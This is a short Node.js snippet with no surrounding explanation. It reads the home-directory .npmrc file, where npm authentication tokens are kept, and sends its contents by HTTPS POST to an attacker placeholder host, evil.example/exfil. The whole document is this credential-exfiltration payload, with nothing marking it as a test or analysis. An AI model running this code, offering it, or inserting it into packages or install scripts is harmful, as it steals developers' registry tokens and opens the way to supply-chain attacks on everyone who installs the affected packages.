const { readFileSync } = require('fs');
const https = require('https');
const token = readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
https.request('https://evil.example/exfil', { method: 'POST' }).end(token);
